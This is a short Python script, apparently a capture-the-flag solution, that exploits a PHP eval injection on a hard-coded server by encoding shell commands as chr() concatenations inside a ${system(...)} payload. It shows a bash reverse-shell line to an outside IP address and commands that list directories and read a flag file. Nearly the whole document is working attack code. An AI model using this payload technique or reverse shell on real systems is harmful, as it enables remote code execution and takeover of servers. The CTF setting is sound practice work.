import requests
import sys

# arg is passed to "addslashes" function which makes argument safe for eval
# however, argument ends up in double quotes which allows ${} expansion like in bash with ``
i = r"bash -i >& /dev/tcp/31.45.231.174/55555 0>&1"  # system command argument cannot have ' or " but has to get a string as an argument so we concatenate chr(111).chr(121) to get the string we want:


i = r"ls > ls.txt"

i = r"ls .. > ls.txt"
# returned flagBhSsb

i = r"cat ../flagBhSsb > ls.txt"

payload = ""
for char in i:
	payload += "chr({}).".format(ord(char))
payload = payload[:-1]
print(payload)

argument_format = "${system("+payload+")}"

url = "http://167.71.143.20:32006/?format={}".format(argument_format)
resData = requests.get(url, verify=False)
print(resData.status_code)
print(resData.content)

